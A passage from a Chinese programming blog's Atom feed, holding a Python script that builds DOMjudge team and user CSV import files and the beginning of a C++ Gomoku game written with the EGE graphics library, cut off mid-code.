    <category term="C++" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"/>
    
    
    <category term="GUI" scheme="https://blog.todest.cn/tags/GUI/"/>
    
  </entry>
  
  <entry>
    <title>DOMjudge账号生成脚本</title>
    <link href="https://blog.todest.cn/post/a25c27c8/"/>
    <id>https://blog.todest.cn/post/a25c27c8/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-05-11T09:35:55.902Z</updated>
    
    <content type="html"><![CDATA[<p>由于 <code>DOMjudge</code> 自带的添加队伍的不是很方便，所以还是自己写个python脚本生成 <code>csv</code> 导入数据库，配合 <code>phpmyadmin</code> 使用。<br><a id="more"></a></p><blockquote><p>$Vesion1.0$  个人赛账号生成脚本</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_team</span>(<span class="params">team_id, Users</span>):</span></span><br><span class="line">    team = open(<span class="string">&#x27;import_team.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(Users)):</span><br><span class="line">        team.writelines(<span class="string">&#x27;&quot;%d&quot;,&quot;%d&quot;,&quot;%s&quot;,&quot;3&quot;,&quot;1&quot;,&quot;1&quot;,&quot;%s&quot;,NULL,NULL,NULL,&quot;0&quot;\n&#x27;</span></span><br><span class="line">                        % (team_id + i, i + <span class="number">1</span>, Users[i], Users[i]))</span><br><span class="line">    team.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_user</span>(<span class="params">user_id, team_id, Users</span>):</span></span><br><span class="line">    user = open(<span class="string">&#x27;import_user.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(Users)):</span><br><span class="line">        user.writelines(<span class="string">&#x27;&quot;%d&quot;,&quot;user%02d&quot;,&quot;%s&quot;,NULL,NULL,NULL,NULL,NULL,NULL,&quot;1&quot;,&quot;%d&quot;\n&#x27;</span></span><br><span class="line">                        % (user_id + i, i + <span class="number">1</span>, Users[i], i + team_id))</span><br><span class="line">    user.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_userrole</span>(<span class="params">user_id, Users</span>):</span></span><br><span class="line">    userrole = open(<span class="string">&#x27;import_userrole.csv&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(Users)):</span><br><span class="line">        userrole.writelines(<span class="string">&#x27;&quot;%d&quot;,&quot;3&quot;\n&#x27;</span> % (user_id + i))</span><br><span class="line">    userrole.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    User_id = <span class="number">3</span> <span class="comment"># 视情况而定，默认id为1,2的分别是admin,judgehost,所以这里从3开始</span></span><br><span class="line">    Team_id = <span class="number">1</span> <span class="comment"># 视情况而定，默认初始为 1</span></span><br><span class="line">    User = open(<span class="string">&#x27;user.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    User = User.readlines()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(User)):</span><br><span class="line">        User[j] = User[j].strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    import_team(Team_id, User)</span><br><span class="line">    import_user(User_id, Team_id, User)</span><br><span class="line">    import_userrole(User_id, User)</span><br><span class="line">    print(User)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;由于 &lt;code&gt;DOMjudge&lt;/code&gt; 自带的添加队伍的不是很方便，所以还是自己写个python脚本生成 &lt;code&gt;csv&lt;/code&gt; 导入数据库，配合 &lt;code&gt;phpmyadmin&lt;/code&gt; 使用。&lt;br&gt;</summary>
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/"/>
    
    
    <category term="Python" scheme="https://blog.todest.cn/tags/Python/"/>
    
    <category term="Domjudge" scheme="https://blog.todest.cn/tags/Domjudge/"/>
    
  </entry>
  
  <entry>
    <title>五子棋</title>
    <link href="https://blog.todest.cn/post/fc33752b/"/>
    <id>https://blog.todest.cn/post/fc33752b/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-05-11T09:38:19.675Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>C++课程设计作业，包含人工智障$AI$</p></blockquote><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;graphics.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> pos[<span class="number">20</span>][<span class="number">20</span>];<span class="comment">//1●-1○0×</span></span><br><span class="line"><span class="keyword">int</span> black[<span class="number">20</span>][<span class="number">20</span>], white[<span class="number">20</span>][<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123; &#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125; &#125;;</span><br><span class="line"><span class="keyword">bool</span> key;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">End</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setfont(<span class="number">80</span>, <span class="number">0</span>, <span class="string">&quot;宋体&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">1</span>)xyprintf(<span class="number">240</span>, <span class="number">245</span>, <span class="string">&quot;黑方获胜&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> xyprintf(<span class="number">240</span>, <span class="number">245</span>, <span class="string">&quot;白方获胜&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Checker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setcolor(EGERGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">12</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[i][j])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line"><span class="keyword">if</span> (pos[i][j] != pos[i][j + p])</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line">line(i * <span class="number">40</span> + <span class="number">80</span>, j * <span class="number">40</span>, i * <span class="number">40</span> + <span class="number">80</span>, (j + <span class="number">4</span>) * <span class="number">40</span>);</span><br><span class="line">End(pos[i][j]);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line"><span class="keyword">if</span> (pos[i][j] != pos[i + p][j + p])</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line">line(i * <span class="number">40</span> + <span class="number">80</span>, j * <span class="number">40</span>, (i + <span class="number">4</span>) * <span class="number">40</span> + <span class="number">80</span>, (j + <span class="number">4</span>) * <span class="number">40</span>);</span><br><span class="line">End(pos[i][j]);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line"><span class="keyword">if</span> (pos[i][j] != pos[i + p][j])</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line">line(i * <span class="number">40</span> + <span class="number">80</span>, j * <span class="number">40</span>, (i + <span class="number">4</span>) * <span class="number">40</span> + <span class="number">80</span>, j * <span class="number">40</span>);</span><br><span class="line">End(pos[i][j]);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">5</span>; i &lt;= <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">12</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pos[i][j])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line"><span class="keyword">if</span> (pos[i][j] != pos[i - p][j + p])</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line">line(i * <span class="number">40</span> + <span class="number">80</span>, j * <span class="number">40</span>, (i - <span class="number">4</span>) * <span class="number">40</span> + <span class="number">80</span>, (j + <span class="number">4</span>) * <span class="number">40</span>);</span><br><span class="line">End(pos[i][j]);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ChessBoard</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbkcolor(EGERGB(<span class="number">199</span>, <span class="number">156</span>, <span class="number">124</span>));</span><br><span class="line">setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">120</span>; i &lt;= <span class="number">680</span>; i += <span class="number">40</span>)</span><br><span class="line">&#123;</span><br><span class="line">line(<span class="number">120</span>, i - <span class="number">80</span>, <span class="number">680</span>, i - <span class="number">80</span>);<span class="comment">//X120-680</span></span><br><span class="line">line(i, <span class="number">40</span>, i, <span class="number">600</span>);<span class="comment">//Y40-600</span></span><br><span class="line">&#125;</span><br><span class="line">setfillcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">bar(<span class="number">240</span> - <span class="number">4</span>, <span class="number">160</span> - <span class="number">4</span>, <span class="number">240</span> + <span class="number">4</span>, <span class="number">160</span> + <span class="number">4</span>);</span><br><span class="line">bar(<span class="number">240</span> - <span class="number">4</span>, <span class="number">480</span> - <span class="number">4</span>, <span class="number">240</span> + <span class="number">4</span>, <span class="number">480</span> + <span class="number">4</span>);</span><br><span class="line">bar(<span class="number">560</span> - <span class="number">4</span>, <span class="number">160</span> - <span class="number">4</span>, <span class="number">560</span> + <span class="number">4</span>, <span class="number">160</span> + <span class="number">4</span>);</span><br><span class="line">bar(<span class="number">560</span> - <span class="number">4</span>, <span class="number">480</span> - <span class="number">4</span>, <span class="number">560</span> + <span class="number">4</span>, <span class="number">480</span> + <span class="number">4</span>);</span><br><span class="line">bar(<span class="number">400</span> - <span class="number">4</span>, <span class="number">320</span> - <span class="number">4</span>, <span class="number">400</span> + <span class="number">4</span>, <span class="number">320</span> + <span class="number">4</span>);</span><br><span class="line">setfont(<span class="number">10</span>, <span class="number">0</span>, <span class="string">&quot;黑体&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">40</span>; i &lt;= <span class="number">600</span>; i += <span class="number">40</span>)</span><br><span class="line">&#123;</span><br><span class="line">xyprintf(<span class="number">100</span>, i - <span class="number">3</span>, <span class="string">&quot;%d&quot;</span>, (<span class="keyword">int</span>)(i / <span class="number">40</span>));</span><br><span class="line">xyprintf(i + <span class="number">78</span>, <span class="number">20</span>, <span class="string">&quot;%c&quot;</span>, (<span class="keyword">char</span>)(i / <span class="number">40</span> + <span class="string">&#x27;A&#x27;</span> - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">setcolor(EGERGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">setfont(<span class="number">20</span>, <span class="number">0</span>, <span class="string">&quot;宋体&quot;</span>);</span><br><span class="line">xyprintf(<span class="number">10</span>, <span class="number">40</span>, <span class="string">&quot;当前子数&quot;</span>);</span><br><span class="line">setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span 